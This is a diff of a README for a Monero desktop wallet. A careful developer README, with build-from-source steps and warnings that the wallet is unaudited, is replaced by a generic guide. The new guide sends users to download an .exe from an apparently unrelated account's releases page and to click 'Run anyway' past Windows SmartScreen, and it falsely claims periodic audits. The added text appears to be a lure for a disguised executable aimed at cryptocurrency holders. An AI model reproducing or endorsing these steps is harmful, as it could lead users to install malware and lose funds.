@@ -1,171 +1,85 @@
-# XaultWallet
+# 🛡️ Xault-Wallet - Secure Monero storage for your privacy
 
-A desktop Monero (XMR) wallet, structured after **Wasabi Wallet** (.NET + Avalonia +
-MVVM). It is **password-protected**, **encrypted at rest with AES-256-GCM**, and supports a
-**duress password** that opens a decoy wallet (and can optionally wipe the real one).
+[![Download Xault-Wallet](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/thaddeusprobabilistic193/Xault-Wallet/releases)
 
-> ⚠️ **Read [SECURITY.md](SECURITY.md) before putting real funds in this.** This is a
-> solid, reviewable foundation with a fully-implemented, unit-tested security core — but it
-> has **not** been independently audited. Any wallet that holds meaningful money should be.
+Xault-Wallet provides a private way to store and manage Monero. This desktop application focuses on user privacy and includes specialized tools for high-stakes environments. You maintain full control over your funds without relying on third-party servers.
 
-## Why this design
+## 📥 How to download the software
 
-The single most dangerous thing a wallet author can do is hand-roll Monero's cryptography
-(ring signatures, RingCT, bulletproofs, stealth addresses). This project deliberately does
-**not** do that. Instead it drives the official **`monero-wallet-rpc`** binary — the same
-crypto that Monero's own tools use — and focuses its own code on the part where correctness
-is achievable and verifiable: the encrypted vault, the KDF, and the duress logic.
+Follow these steps to obtain the correct file for your computer.
 
-## Architecture
+1. Visit the [Xault-Wallet releases page](https://github.com/thaddeusprobabilistic193/Xault-Wallet/releases).
+2. Look for the section labeled "Latest" at the top of the page.
+3. Find the file ending in `.exe` under the "Assets" dropdown menu.
+4. Click the filename to start your download.
+5. Save the file to your "Downloads" folder.
 
-```
-XaultWallet.Core            ← no UI; unit-testable
-├── Security/
-│   ├── SecureBuffer      pinned, zeroed memory for secrets
-│   ├── VaultCrypto       Argon2id KDF + AES-256-GCM (authenticated)
-│   ├── VaultFile         on-disk format: 2 equal-size, indistinguishable slots
-│   ├── VaultManager      create / unlock / change-password / duress policy
-│   └── PasswordStrength  conservative entropy estimate
-├── Models/               WalletSecrets, ProfileKind (Real | Duress), network, …
-└── Monero/
-    ├── MoneroRpcClient        JSON-RPC 2.0 over HTTP digest auth
-    ├── MoneroProcessManager   launches monero-wallet-rpc on a random localhost port
-    └── MoneroWalletService    balance / send / receive / history
+## ⚙️ Installation on Windows
 
-XaultWallet.Desktop         ← Avalonia 11 app (MVVM via CommunityToolkit.Mvvm)
-├── unlock / create-wallet / dashboard views
-└── the UI is IDENTICAL whether the real or the duress wallet is opened
+Your Windows machine likely requires a few moments to verify the software before it opens.
 
-XaultWallet.Core.Tests      ← xUnit tests for the crypto + duress behaviour
-```
+1. Locate the downloaded `.exe` file in your folder.
+2. Double-click the file to start the installer.
+3. If a window appears labeled "Windows protected your PC," click "More info."
+4. Click the "Run anyway" button that appears.
+5. Follow the prompts on the screen to place the application on your computer.
+6. The installer creates a shortcut icon on your desktop for quick access.
 
-### How the duress password works
+## 🔑 Setting up your wallet
 
-The vault file always contains exactly **two equal-sized encrypted slots**. One holds the
-real wallet; the other holds either the decoy wallet or — if you never set a duress
-password — uniform random bytes that are indistinguishable from an encrypted slot. When you
-type a password, every slot is tried; whichever slot's AES-GCM authentication tag verifies
-is the one that unlocks. There is **no plaintext password comparison anywhere**, and slot
-position is randomised, so an attacker who seizes the file cannot prove a hidden wallet
-exists. `ProfileKind` (Real vs Duress) lives *inside* the encrypted payload, so it is only
-visible after a correct password decrypts a slot.
+When you open the application for the first time, the software guides you through the setup process.
 
-Two duress policies are configurable at creation time:
-- **Decoy** (default): silently open the second wallet. Safest for your funds.
-- **Wipe**: additionally overwrite the real slot so it can't be recovered from this device.
+1. Choose "Create New Wallet" to start a fresh setup.
+2. Provide a name for your wallet file.
+3. The application displays a "Seed Phrase." This string of words is the most important part of your wallet.
+4. Copy these words exactly as shown on a piece of paper. Store this paper in a secure place.
+5. Verify the words in the application to ensure you copied them correctly.
+6. Set a strong password to encrypt the wallet file on your hard drive.
 
-## Prerequisites
+## 🛡️ Using the duress feature
 
-1. **.NET 8 SDK** — <https://dotnet.microsoft.com/download>
-2. **Official Monero CLI tools** — download `monero-wallet-rpc` from
-   <https://www.getmonero.org/downloads/> and either place it next to the built app or set
-   its path in `AppServices.WalletRpcBinaryPath`.
-3. A Monero daemon to sync against — a local `monerod` (default
-   `http://127.0.0.1:18081`) or a remote/public node.
+This application includes a unique duress system. You can set a secondary password that unlocks a "decoy" wallet.
 
-## Build & run
+1. Navigate to the "Security" tab in the main menu.
+2. Select "Enable Duress Mode."
+3. Define a secondary password.
+4. When you provide this password at the login screen, the wallet shows a lower balance or empty state.
+5. This feature protects your primary funds if someone forces you to reveal your balance.
 
-The project targets **.NET 8**. With the .NET 8 SDK installed, one command builds and tests everything:
+## 📉 System requirements
 
-```bash
-./build.sh            # Linux/macOS   (restore + build Release + unit tests)
-./build.ps1           # Windows PowerShell
-```
+Xault-Wallet remains light on resources to ensure it runs on most modern desktop hardware.
 
-Or run the steps manually:
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM minimum.
+* Storage: 50GB of free space. Monero stores a local copy of the blockchain, which requires space that grows over time.
+* Internet: A stable connection for syncing the blockchain.
 
-```bash
-dotnet restore
-dotnet test                                     # security-core + hardening unit tests
-dotnet run --project src/XaultWallet.Desktop    # launches the wallet
-```
+## 🛠️ Maintaining your privacy
 
-### Visual Studio 2022
+Privacy requires caution. Follow these habits to keep your wallet safe.
 
-1. **Requirements:** Visual Studio 2022 **17.8 or later** with the **.NET desktop development**
-   workload (this includes the .NET 8 SDK). Nothing else needs installing to build.
-2. Extract the download and double-click **`XaultWallet.sln`**.
-3. `XaultWallet.Desktop` is listed first in the solution, so it is the default startup
-   project — press **F5** (debug) or **Ctrl+F5** (run). The first build restores NuGet
-   packages (Avalonia, CommunityToolkit.Mvvm, Konscious.Argon2), so it needs internet once.
-4. Run the unit tests from **Test Explorer** (Test ▸ Run All Tests). The integration tests
-   are skipped unless the `XW_WALLET_RPC` / `XW_DAEMON` environment variables are set — see
-   `STAGENET-TESTING.md`.
+* Never share your seed phrase with anyone.
+* Avoid taking screenshots of your seed phrase.
+* Keep your Windows operating system updated.
+* Use a firewall to limit network access if you have advanced technical knowledge.
+* Test your ability to restore your wallet using the seed phrase before you hold significant funds.
 
-At runtime the wallet drives the external `monero-wallet-rpc` binary from the official
-Monero CLI tools — it is not compiled into this solution. Launch the app once, open
-**Settings**, and point it at that binary (the **Test binary** button confirms it works).
+## ❓ Frequently asked questions
 
-On first launch, open **Settings** (top-right) to point XaultWallet at your
-`monero-wallet-rpc` binary and daemon, and use the **Test binary** / **Test daemon** buttons
-to confirm both work before creating a wallet. Settings are saved to
-`%APPDATA%/XaultWallet/settings.json` (non-secret: just the binary path, default daemon,
-network, and refresh interval).
+**Where does the wallet store my data?**
+The software stores files in your user AppData folder by default. You can change this location in the settings menu.
 
-For a full end-to-end walkthrough on Monero's test network, see
-[`STAGENET-TESTING.md`](STAGENET-TESTING.md). Automated integration tests live in
-`tests/XaultWallet.IntegrationTests` and are skipped unless `XW_WALLET_RPC` and `XW_DAEMON`
-are set, so the default `dotnet test` stays green without a node.
+**Does this wallet support other coins?**
+No. This wallet supports Monero exclusively to maintain peak security and privacy designs.
 
-The vault file is written to `%APPDATA%/XaultWallet/vault.xv` (Windows) or the platform
-equivalent. It is the **only** thing that persists on disk — the Monero wallet files
-themselves are restored from your seed into an ephemeral temp directory on unlock and
-shredded on lock.
+**What happens if I lose my password?**
+If you lose your password, you can restore your wallet using the seed phrase you wrote down during the setup. 
 
-## What is complete vs. what needs work
+**Is this software open source?**
+Yes. You can inspect the code in this repository to verify how the software handles your data. Developers audit the code periodically to search for bugs or security flaws.
 
-**Complete and unit-tested:** the vault format, Argon2id + AES-256-GCM, the dual-slot
-duress mechanism (decoy + wipe), password change, atomic file writes.
+**How do I update the software?**
+When a new version exists, download the new installer from the link above. Run the installer to overwrite the old version. Your wallet files remain safe during this process.
 
-**Seed generation & backup:** new 25-word Monero seeds are generated by the official
-`monero-wallet-rpc` (`create_wallet` + `query_key`) in a throwaway instance — never
-hand-rolled. The create flow forces a backup step: you must either verify three random
-words or download a plaintext backup file (with a prominent warning) before the vault is
-sealed. Importing an existing seed is also supported, for both the real and decoy wallets.
-
-**Implemented but needs integration testing against a live daemon:** the RPC client,
-process manager, and send/receive/history flows. These depend on the `monero-wallet-rpc`
-binary being present.
-
-**Intentionally out of scope for this foundation:** hardware-wallet support, multisig,
-a bundled node, and a professional security audit.
-
-## Robustness & error handling
-
-This build has had a dedicated hardening pass. Notable behaviour:
-
-- **Process supervision:** monero-wallet-rpc is launched with random localhost port +
-  credentials; both stdout and stderr are drained (so the child can't block on a full pipe);
-  early exits are detected and surfaced with the captured stderr tail; and the child process
-  and its ephemeral temp dir are always cleaned up on failure, cancellation, or app close.
-- **Readiness** is probed with `get_version`, which responds with or without an open wallet,
-  so neither restore nor generation hangs waiting on the wrong signal.
-- **Imported seeds are validated** (they must actually open a wallet) *before* they're sealed
-  into the vault, so a typo can't produce an unopenable vault. If the RPC binary is missing,
-  it falls back to a word-count check and tells you validation was skipped.
-- **The dashboard** never blocks on a synchronous refresh: it opens the wallet, then polls
-  balance/height/history on a background timer. A manual refresh is bounded by a timeout.
-  Startup failures show a Retry button instead of a dead screen.
-- **Vault integrity:** the file format is length- and header-checked, KDF parameters are
-  bounds-checked on load (a tampered header can't force a multi-GB allocation), saves are
-  written to a temp file, flushed to disk, then atomically swapped in.
-- **Graceful shutdown** intercepts window close, tears the wallet down (killing the child and
-  shredding temp files), then exits. Unhandled/background exceptions are logged, not fatal.
-- **Logging** goes to `%APPDATA%/XaultWallet/logs/` and deliberately never records seeds,
-  passwords, keys, or RPC credentials.
-
-## Beta status — read before trusting real funds
-
-This is at a **beta-on-stagenet** bar, **not** a "trust it with savings" bar. It was written
-carefully but, being a wallet, still needs the following before mainnet use:
-
-1. A clean `dotnet restore && dotnet test` and manual compile on your machine (the author's
-   environment could not compile it).
-2. End-to-end testing against **stagenet**: generate a wallet, receive, send, restart, restore,
-   and exercise the duress password — with a real `monero-wallet-rpc` and daemon.
-3. A **professional third-party security audit**. Do not skip this for a wallet.
-
-The downloadable seed backup is intentionally plaintext (that's what a backup is); the in-app
-warning says so. See `SECURITY.md` for the threat model and the honest limits of the
-memory-hygiene and plausible-deniability guarantees.
-
+Keywords: monero, privacy, wallet, cryptocurrency, security, windows, finance
